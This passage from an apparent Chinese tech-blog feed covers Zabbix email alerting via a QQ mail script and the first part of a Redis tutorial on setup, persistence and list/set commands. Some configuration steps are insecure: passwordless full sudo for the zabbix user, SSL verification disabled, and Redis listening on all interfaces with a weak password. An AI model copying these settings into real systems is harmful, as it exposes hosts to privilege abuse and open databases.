class="line">编辑/etc/sudoers文件，注释如下行；</span><br><span class="line">]# visudo</span><br><span class="line"># Defaults requiretty</span><br><span class="line">添加如下行：</span><br><span class="line">zabbix  ALL=(ALL)  NOPASSWD: ALL</span><br><span class="line"></span><br><span class="line">(2) agent进程要允许执行远程命令； </span><br><span class="line">]# vim /etc/zabbix/zabbix_agentd.conf，设置如下配置：</span><br><span class="line">EnableRemoteCommands=1</span><br><span class="line"></span><br><span class="line">重启服务生效；</span><br></pre></td></tr></table></figure><ul><li>总结：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">host groups --&gt; host --&gt; application --&gt; item (key) --&gt; trigger --&gt; action</span><br><span class="line"></span><br><span class="line">(1) media type</span><br><span class="line">(2) user group/user</span><br><span class="line"></span><br><span class="line">action operations: 可定义为升级方式；</span><br><span class="line">send message </span><br><span class="line">remote command</span><br></pre></td></tr></table></figure><h1 id="Zabbix告警消息通过qq邮件发送"><a href="#Zabbix告警消息通过qq邮件发送" class="headerlink" title="Zabbix告警消息通过qq邮件发送"></a>Zabbix告警消息通过qq邮件发送</h1><ul><li>情形</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zabbix_server (Zabbix) 3.4.11</span><br><span class="line">zabbix_agentd (daemon) (Zabbix) 3.4.11</span><br><span class="line">--------------------------</span><br><span class="line">Zabbix_server 192.168.1.18</span><br><span class="line">Zabbix_agent 192.168.1.28</span><br></pre></td></tr></table></figure><h2 id="Zabbix-server配置"><a href="#Zabbix-server配置" class="headerlink" title="Zabbix-server配置"></a>Zabbix-server配置</h2><ul><li>安装相关的邮件服务，当然qq号不会是自己的啦</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y mailx dos2unix</span><br><span class="line">]# vim /etc/mail.rc</span><br><span class="line">set from=932165012@qq.com</span><br><span class="line">set smtp=smtp.qq.com</span><br><span class="line">set smtp-auth-user=932165012@qq.com</span><br><span class="line">set smtp-auth-password=************   #此次password是授权码，而不是登录密码，自行谷歌解决。</span><br><span class="line">set smtp-auth=login</span><br><span class="line">set ssl-verify=ignore</span><br><span class="line">set nss-config-dir=/etc/pki/nssdb</span><br></pre></td></tr></table></figure><ul><li>测试邮件服务是否可用，收到邮件即可认为成功</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">]# echo &quot;zabbix test mail&quot; |mail -s &quot;zabbix&quot; 932165012@qq.com</span><br></pre></td></tr></table></figure><ul><li>编写bash脚本，<code>/usr/lib/zabbix/alertscripts/mail.sh</code>,Zabbix的配置文件定义此文件为脚本文件目录。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">]# vim /usr/lib/zabbix/alertscripts/mail.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">to=$1</span><br><span class="line">subject=$2</span><br><span class="line">body=$3</span><br><span class="line">#三个参数对应是收件人，主题，邮件主体内容</span><br><span class="line"></span><br><span class="line">date &quot;+%F %T&quot; &gt;&gt; /usr/lib/zabbix/alertscripts/sendmail.log</span><br><span class="line">echo &quot;$to&quot; &quot;$subject&quot; &quot;$body&quot;  &gt;&gt; /usr/lib/zabbix/alertscripts/sendmail.log</span><br><span class="line">#记录发件日志</span><br><span class="line"></span><br><span class="line">echo &quot;$body&quot; | dos2unix -k | mail -s &quot;$subject&quot; &quot;$to&quot;</span><br><span class="line">#发邮件的命令，dos2unix转码发送。防止乱码</span><br><span class="line">]# chmod +x /usr/lib/zabbix/alertscripts/mail.sh</span><br></pre></td></tr></table></figure><h2 id="web界面进行配置"><a href="#web界面进行配置" class="headerlink" title="web界面进行配置"></a>web界面进行配置</h2><h4 id="主机相关配置"><a href="#主机相关配置" class="headerlink" title="主机相关配置"></a>主机相关配置</h4><ul><li>hosts配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Host name   node01.fenghong.tech</span><br><span class="line">Visible name   node01</span><br><span class="line">Groups</span><br><span class="line">My Servers</span><br><span class="line">Agent interfaces</span><br><span class="line">IP addressDNS nameConnect to  Port Default</span><br><span class="line">192.168.1.28      10050</span><br><span class="line">#Groups随便从列表里选一个，我选的是my servers。</span><br><span class="line">#主要是主机名，别名和Agent的IP配置，当然如果有DNS解析，填写主机名也是没有问题的</span><br><span class="line">#点击Add添加即可</span><br></pre></td></tr></table></figure><ul><li>applications</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Configuration-----&gt; node01 -----&gt; Applications ------&gt; Create Application</span><br><span class="line">name    nginx status</span><br></pre></td></tr></table></figure><ul><li>items</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Configuration-----&gt; node01 -----&gt; items -----&gt; Create item </span><br><span class="line">NameNginx service state</span><br><span class="line">TypeZabbix agent#系统默认</span><br><span class="line">Keynet.tcp.port[192.168.1.28,80]</span><br><span class="line">Host interface  192.168.1.28:10050#系统默认</span><br><span class="line">Type of information   Numeric(unsigned)#系统默认</span><br><span class="line">Update interval 5s</span><br><span class="line">Applications  nginx status   #刚创建的</span><br></pre></td></tr></table></figure><ul><li>trigger配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Configuration-----&gt; node01 -----&gt; triggers -----&gt; create trigger</span><br><span class="line">Namenginx down</span><br><span class="line">SeverityHigh</span><br><span class="line">Exprssion-----&gt; add</span><br><span class="line">Last of(T)   3   Count #下拉选择Count</span><br><span class="line">insert</span><br><span class="line"></span><br><span class="line">#配置完成Add</span><br></pre></td></tr></table></figure><h4 id="报警动作配置"><a href="#报警动作配置" class="headerlink" title="报警动作配置"></a>报警动作配置</h4><ul><li>Meida types配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Administration-----&gt; Media types ------&gt; create media type</span><br><span class="line"></span><br><span class="line">Name  QqMailAlarm  #名字随便写</span><br><span class="line">Type  Script       #选择Script</span><br><span class="line">Script name  mail.sh#填写为上面编写的脚本文件</span><br><span class="line">Script parameters    ParameterAction</span><br><span class="line">&#123;ALERT.SENDTO&#125;</span><br><span class="line">&#123;ALERT.SUBJECT&#125;</span><br><span class="line">&#123;ALERT.MESSAGE&#125;</span><br><span class="line">#这三个宏变量顺序不能错，然后点击Add即可</span><br></pre></td></tr></table></figure><ul><li>用户配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Administration-----&gt; Users -----&gt; Admin -----&gt; Media -----&gt; Add</span><br><span class="line"></span><br><span class="line">Type QqMailAlarm  #Media Type 的名称，下拉选项</span><br><span class="line">Send to  932165012@qq.com #填写发送至相应的qq邮箱</span><br><span class="line">When active 1-7,00:00-24:00 #发送的时间</span><br><span class="line">Use if severity#级别，建议根据人员的级别而发送不同的通知，默认全部勾选</span><br><span class="line">Not classified</span><br><span class="line">Information</span><br><span class="line">Warning</span><br><span class="line">Average</span><br><span class="line">High</span><br><span class="line">Disaster</span><br><span class="line">Enabled</span><br><span class="line"># 配置好后，点击添加Add完成用户的配置。</span><br></pre></td></tr></table></figure><ul><li>配置action,默认已经配置好trigger和hosts。比如</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Configuration -----&gt; Actions -----&gt; create action -----&gt; Action</span><br><span class="line">Namenginx sevice    #选择一个名字，这里用nginx服务来检测</span><br><span class="line">Conditions LabelNameAction</span><br><span class="line">ATrigger = node01: nginx down Remove</span><br><span class="line">#node01 为配置好的hosts</span><br><span class="line">#nginx down 为配置好的trigger</span><br><span class="line">#选择Trigger，点击select即可选择配置好的trigger</span><br><span class="line">New condition</span><br><span class="line">Add</span><br><span class="line">Enabled</span><br><span class="line"></span><br><span class="line">-----&gt; Operations</span><br><span class="line">Default operation step duration     60s#选择60s为了方便检测是否发送了邮件</span><br><span class="line">Default subjectProblem: &#123;TRIGGER.NAME&#125;   #默认即可</span><br><span class="line">Default message</span><br><span class="line">Problem started at &#123;EVENT.TIME&#125; on &#123;EVENT.DATE&#125;</span><br><span class="line">Problem name: &#123;TRIGGER.NAME&#125;</span><br><span class="line">Host: &#123;HOST.NAME&#125;</span><br><span class="line">Severity: &#123;TRIGGER.SEVERITY&#125;</span><br><span class="line">Original problem ID: &#123;EVENT.ID&#125;</span><br><span class="line">&#123;TRIGGER.URL&#125;</span><br><span class="line">----&gt; 点击Operation New，来进行配置动作。</span><br><span class="line">Send to Users然后Add选择Admin</span><br><span class="line">Send only to    下拉选择QqMailAlarm  </span><br><span class="line"></span><br><span class="line">#然后点击最下面的Add，添加Action</span><br><span class="line">#至此，基本结束。</span><br></pre></td></tr></table></figure><ul><li>验证告警信息是否成功自动发送邮件,停止node01上的nginx服务,能立马收到邮件。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">]# systemctl stop nginx</span><br></pre></td></tr></table></figure><ul><li>当然，Zabbix也支持远程的脚本命令来进行某些操作，比如重启nginx服务，这里面又涉及<code>Remote command</code>，这里不赘述了。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="server" scheme="https://fenghong.tech/tags/server/"/>
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="internet" scheme="https://fenghong.tech/tags/internet/"/>
    
      <category term="watch" scheme="https://fenghong.tech/tags/watch/"/>
    
  </entry>
  
  <entry>
    <title>Redis</title>
    <link href="https://fenghong.tech/redis.html"/>
    <id>https://fenghong.tech/redis.html</id>
    <published>2018-07-20T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>分布式系统存储特点</li><li>Redis概述及安装</li><li>Redis集群及HA高可用实现</li></ul><h1 id="分布式存储特点"><a href="#分布式存储特点" class="headerlink" title="分布式存储特点"></a>分布式存储特点</h1><p>CAP：一个分布式系统不可能同时满足C、A、P三个特性，最多可同时满足其中两者；对于分布式统满足分区容错性几乎是必须的<br>    C：多个数据节点上的数据一致；<br>    A：用户发出请求后的有限时间范围内返回结果；<br>    P：network partition，网络发生分区后，服务是否依然可用；<br>BASE：BA，S，E，基于CAP演化而来<br>    BA：Basically Available，基本可用；<br>    S：Soft state，软状态/柔性事务，即状态可以在一个时间窗口内是不同步的；<br>    E：Eventually consistency，最终一致性；<br>分布式一致性协议：Paxos，Raft等</p><h1 id="Redis概述"><a href="#Redis概述" class="headerlink" title="Redis概述"></a>Redis概述</h1><blockquote><p>随着业务的增长和产品的完善，急速增长的数据给Oracle数据库带来了很大的压力，而随着我们对产品服务质量要求的提高，传统的数据查询方式已无法满足我们需求。为此我们需要寻找另外一种模式来提高数据查询效率。NoSQL内存数据库是最近兴起的新型数据库，<a href="www.nosql-databases.org">Nosql官网</a>，它的特点就是把数据放在内存中操作，数据处理速度相对于磁盘提高了好几个量级，因此，通过把经常访问的数据转移到内存数据库中，不但可以缓解Oracle的访问压力，而且可以极大提高数据的访问速度，提高用户体验。 </p><p>Redis是一个开源的，先进的key-value持久化产品。它通常被称为数据结构服务器，<code>REmote DIctionary Server</code>，它的值可以是字符串（String）、哈希（Map）、列表（List）、集合（Sets）和有序集合（Sorted sets）等类型。可以在这些类型上面做一些原子操作，如：字符串追加、增加Hash里面的值、添加元素到列表、计算集合的交集，并集和差集；或者区有序集合中排名最高的成员。为了取得好的性能，Redis是一个内存型数据库。不限于此，Redis也可以把数据持久化到磁盘中，或者把数据操作指令追加了一个日志文件，把它用于持久化。也可以用Redis容易的搭建master-slave架构用于数据复制。其它让它像缓存的特性包括，简单的check-and-set机制，pub/sub和配置设置。Redis可以用大部分程序语言来操作：C、C++、C#、Java、Node.js、php、ruby等等。Redis是用ANSIC写的，可以运行在多数POSIX系统，如：Linux，*BSD，OS X和Soloris等。官方版本不支持Windows下构建，可以选择一些修改过的版本，照样可以使用Redis。 </p></blockquote><h1 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h1><ul><li>安装及配置</li></ul><p>centos系统的base仓库自带redis-3.2.10，我们用yum安装即可.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">~]# yum info redis</span><br><span class="line">~]# yum install -y redis</span><br><span class="line">~]# rpm -q --scripts redis   </span><br><span class="line">~]# rpm -ql redis</span><br><span class="line">~]# vim /etc/redis.conf   #仅修改以下选项</span><br><span class="line">bind 0.0.0.0#增加监听地址为所有</span><br><span class="line">requirepass ilinux    #要求密码验证</span><br><span class="line">~]# systemctl start redis</span><br><span class="line">~]# grep &apos;^####&apos; /etc/redis.conf          #配置文件的段落如下</span><br><span class="line">################################## INCLUDES ###################################</span><br><span class="line">################################## NETWORK #####################################</span><br><span class="line">################################# GENERAL #####################################</span><br><span class="line">################################ SNAPSHOTTING  ################################</span><br><span class="line">################################# REPLICATION #################################</span><br><span class="line">################################## SECURITY ###################################</span><br><span class="line">################################### LIMITS ####################################</span><br><span class="line">############################## APPEND ONLY MODE ###############################</span><br><span class="line">################################ LUA SCRIPTING  ###############################</span><br><span class="line">################################ REDIS CLUSTER  ###############################</span><br><span class="line">################################## SLOW LOG ###################################</span><br><span class="line">################################ LATENCY MONITOR ##############################</span><br><span class="line">############################# EVENT NOTIFICATION ##############################</span><br><span class="line">############################### ADVANCED CONFIG ###############################</span><br></pre></td></tr></table></figure><ul><li>Redis的基本数据结构（5种）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.STRING：可以存储字符串、浮点型、整型，如果是字符串可以执行字符串操作，如果是浮点型、整型也可以执行加减操作。redis会识别出它的具体类型。</span><br><span class="line">2.LIST：链表，链表中的每个NODE包含一个字符串。可以对链表进行两端推入、弹出操作。</span><br><span class="line">3.SET：无序集合，不会存在相同的集合元素，集合的交集、并集、差集运算。</span><br><span class="line">4.HASH：键值对的无需散列，增、删、获取键值。</span><br><span class="line">5.ZSET：有序集合，根据一个浮点数分值来排序。</span><br></pre></td></tr></table></figure><ul><li>redis两种持久化原理（RDB、AOF）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis支持两种方式来持久化数据</span><br><span class="line">第一种：snapshotting(镜像或快照）也称RDB;</span><br><span class="line">第二种：AOF(append-only file 文件追加)。</span><br><span class="line">如：</span><br><span class="line">RDB：镜像模式就是将某个时间段的所有内存数据直接写入硬盘。</span><br><span class="line">AOF：将执行的写命令增量复制到硬盘里面。</span><br><span class="line">这两种其实就是不同的侧重，RDB是数据持久化，AOF是命令持久化，数据持久化比较直接，还原的时候直接恢复数据即可。命令持久化恢复的话需要执行一遍命令才行。</span><br><span class="line"></span><br><span class="line">redis执行持久化操作取决于两方面：默认是根据持久化配置来执行，还有就是用户手动触发。手动触发有两个命令</span><br><span class="line">SAVE:会block所有的用户操作，知道持久化结束。</span><br><span class="line">BGSAVE:后台子进程执行，linux中使用fork命令开启一个子进程副本，这个子进程副本与主进程共用一套内存空间，直到主进程或子进程对内存进行修改，被修改之后的内存区域将被子进程复制出来单独使用。</span><br></pre></td></tr></table></figure><p>持久化存储对应的配置文件设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/redis.conf</span><br><span class="line">################################ SNAPSHOTTING  ################################</span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br><span class="line">save 5 200000</span><br><span class="line">stop-writes-on-bgsave-error yes</span><br><span class="line">rdbcompression yes</span><br><span class="line">rdbchecksum yes</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line">dir /var/lib/redis</span><br><span class="line">############################## APPEND ONLY MODE ###############################</span><br><span class="line">appendonly no</span><br><span class="line">appendfilename &quot;appendonly.aof&quot;</span><br><span class="line">appendfsync everysec</span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line">auto-aof-rewrite-min-size 64mb</span><br><span class="line">aof-load-truncated yes</span><br></pre></td></tr></table></figure><p>登录，查询帮助，Redis3.2版本有个很好的显示帮助，Tab补全功能强大。</p><ul><li>基本用法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">~]# redis-cli </span><br><span class="line">127.0.0.1:6379&gt; AUTH ilinux     #认证，和配置文件的requirepass相对应</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; help</span><br><span class="line">redis-cli 3.2.10</span><br><span class="line">To get help about Redis commands type:</span><br><span class="line">      &quot;help @&lt;group&gt;&quot; to get a list of commands in &lt;group&gt;</span><br><span class="line">      &quot;help &lt;command&gt;&quot; for help on &lt;command&gt;</span><br><span class="line">      &quot;help &lt;tab&gt;&quot; to get a list of possible help topics</span><br><span class="line">      &quot;quit&quot; to exit</span><br><span class="line">127.0.0.1:6379&gt; help @list    </span><br><span class="line">127.0.0.1:6379&gt; rpush weekdays Sunday</span><br><span class="line">127.0.0.1:6379&gt; LPUSH weekdays Sun Mon Tue Wed</span><br><span class="line">127.0.0.1:6379&gt; lindex weekdays 0</span><br><span class="line">&quot;Wed&quot;</span><br><span class="line">127.0.0.1:6379&gt; lindex weekdays 1</span><br><span class="line">&quot;Tue&quot;</span><br><span class="line">127.0.0.1:6379&gt; lindex weekdays 2</span><br><span class="line">&quot;Mon&quot;</span><br><span class="line">127.0.0.1:6379&gt; lindex weekdays 3</span><br><span class="line">&quot;Sun&quot;</span><br><span class="line">127.0.0.1:6379&gt; lindex weekdays 4</span><br><span class="line">&quot;Sunday&quot;</span><br><span class="line">127.0.0.1:6379&gt; llen weekdays</span><br><span class="line">(integer) 5</span><br><span class="line">127.0.0.1:6379&gt; lpop weekdays</span><br><span class="line">&quot;Wed&quot;</span><br><span class="line">127.0.0.1:6379&gt; lpop weekdays</span><br><span class="line">&quot;Tue&quot;</span><br><span class="line">127.0.0.1:6379&gt; lpop weekdays</span><br><span class="line">&quot;Mon&quot;</span><br><span class="line">127.0.0.1:6379&gt; lpop weekdays</span><br><span class="line">&quot;Sun&quot;</span><br><span class="line">127.0.0.1:6379&gt; llen weekdays</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; lindex weekdays 0</span><br><span class="line">&quot;Sunday&quot;</span><br><span class="line">127.0.0.1:6379&gt; rpush weekdays Mon Tue Wed</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange weekdays 1 3</span><br><span class="line">1) &quot;Mon&quot;</span><br><span class="line">2) &quot;Tue&quot;</span><br><span class="line">3) &quot;Wed&quot;</span><br><span class="line">127.0.0.1:6379&gt; llen weekdays</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange weekdays 1 10</span><br><span class="line">1) &quot;Mon&quot;</span><br><span class="line">2) &quot;Tue&quot;</span><br><span class="line">3) &quot;Wed&quot;</span><br><span class="line">127.0.0.1:6379&gt; lrange weekdays 0 10</span><br><span class="line">1) &quot;Sunday&quot;</span><br><span class="line">2) &quot;Mon&quot;</span><br><span class="line">3) &quot;Tue&quot;</span><br><span class="line">4) &quot;Wed&quot;</span><br><span class="line">127.0.0.1:6379&gt; ltrim weekdays 1 2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; lrange weekdays 0 10</span><br><span class="line">1) &quot;Mon&quot;</span><br><span class="line">2) &quot;Tue&quot;</span><br></pre></td></tr></table></figure><ul><li>@SET，无序集合，不会存在相同的集合元素，集合的交集、并集、差集运算。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; help @set</span><br><span class="line">  SADD key member [member ...]</span><br><span class="line">  summary: Add one or more members to a set</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SCARD key</span><br><span class="line">  summary: Get the number of members in a set</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SDIFF key [key ...]</span><br><span class="line">  summary: Subtract multiple sets</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SDIFFSTORE destination key [key ...]</span><br><span class="line">  summary: Subtract multiple sets and store the resulting set in a key</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SINTER key [key ...]</span><br><span class="line">  summary: Intersect multiple sets</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SINTERSTORE destination key [key ...]</span><br><span class="line">  summary: Intersect multiple sets and store the resulting set in a key</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SISMEMBER key member</span><br><span class="line">  summary: Determine if a given value is a member of a set</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SMEMBERS key</span><br><span class="line">  summary: Get all the members in a set</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SMOVE source destination member</span><br><span class="line">  summary: Move a member from one set to another</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SPOP key [count]</span><br><span class="line">  summary: Remove and return one or multiple random members from a set</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SRANDMEMBER key [count]</span><br><span class="line">  summary: Get one or multiple random members from a set</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SREM key member [member ...]</span><br><span class="line">  summary: Remove one or more members from a set</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SSCAN key cursor [MATCH pattern] [COUNT count]</span><br><span class="line">  summary: Incrementally iterate Set elements</span><br><span class="line">  since: 2.8.0</span><br><span class="line"></span><br><span class="line">  SUNION key [key ...]</span><br><span class="line">  summary: Add multiple sets</span><br><span class="line">  since: 1.0.0</span><br><span class="line"></span><br><span class="line">  SUNIONSTORE destination key [key 